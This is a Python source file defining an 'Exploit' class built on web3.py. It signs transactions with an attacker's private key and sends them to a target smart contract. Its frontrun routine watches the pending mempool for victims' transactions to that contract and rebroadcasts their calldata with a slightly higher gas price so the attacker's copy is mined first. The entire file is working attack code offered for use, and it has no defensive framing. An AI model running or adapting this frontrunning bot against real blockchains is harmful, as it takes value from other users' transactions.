from web3 import Web3
import time


class Exploit:
    def __init__(
        self,
        txs: list,
        rpc: str,
        contract: str,
        attacker: str,
        attacker_private_key: str,
    ):
        self.txs = txs
        self.w3 = Web3(Web3.HTTPProvider(rpc))
        self.contract = Web3.toChecksumAddress(contract)
        self.attacker = Web3.toChecksumAddress(attacker)
        self.attacker_private_key = attacker_private_key
        pass

    def __repr__(self):
        return "Exploit: (txs={})".format(self.txs)

    def execute(self):
        for tx in self.txs:
            run_tx = {
                "from": self.attacker,
                "to": self.contract,
                "gasPrice": 10 ** 10,  # 10 gwei
                "gas": 200000, # should be estimated
                "value": tx.tx_data["value"],
                "data": tx.tx_data["input"],
            }

            receipt = self.send_tx(run_tx)

    def frontrun(self):
        print("Waiting for a victim to reach into the honey jar.")

        # Wait for each tx and frontrun it.
        for tx in self.txs:
            victim_tx = self.wait_for(self.contract, tx)

            frontrun_tx = {
                "from": self.attacker,
                "to": self.contract,
                "gasPrice": hex(victim_tx["gasPrice"] + 1),
                "data": victim_tx["input"],
                "gas": victim_tx["gas"],
                "value": victim_tx["value"],
            }

            print("Frontrunning with tx: {tx}".format(tx=frontrun_tx))
            receipt = self.send_tx(frontrun_tx)
            print(
                "Mined transaction: {tx}".format(tx=(receipt["transactionHash"].hex()))
            )

    def send_tx(self, tx: dict) -> str:
        # Make sure the addresses are checksummed.
        tx["from"] = Web3.toChecksumAddress(tx["from"])
        tx["to"] = Web3.toChecksumAddress(tx["to"])
        tx["nonce"] = self.w3.eth.getTransactionCount(self.attacker)

        signed_tx = self.w3.eth.account.signTransaction(tx, self.attacker_private_key)
        tx_hash = self.w3.eth.sendRawTransaction(signed_tx.rawTransaction)
        tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash, timeout=300)

        return tx_receipt

    def wait_for(self, contract, tx):
        # Setting up filter
        pending_filter = self.w3.eth.filter("pending")
        # Flushing the filter once
        print(
            "Flushing {len} pending transactions.".format(
                len=len(pending_filter.get_new_entries())
            )
        )

        while True:
            time.sleep(1)
            pending_txs_hashes = pending_filter.get_new_entries()
            if len(pending_txs_hashes) == 0:
                continue
            print(
                "Checking {len} pending transactions.".format(
                    len=len(pending_txs_hashes)
                )
            )
            for hash in pending_txs_hashes:
                pending_tx = self.w3.eth.getTransaction(hash)

                try:
                    if (pending_tx["to"].lower() == contract.lower()) and (
                        pending_tx["input"].lower() == tx.tx_data["input"].lower()
                    ):
                        print(
                            "Found pending tx: {tx} from: {sender}.".format(
                                tx=pending_tx["hash"].hex(), sender=pending_tx["from"]
                            )
                        )
                        return pending_tx
                except Exception as e:
                    # print(e)
                    pass
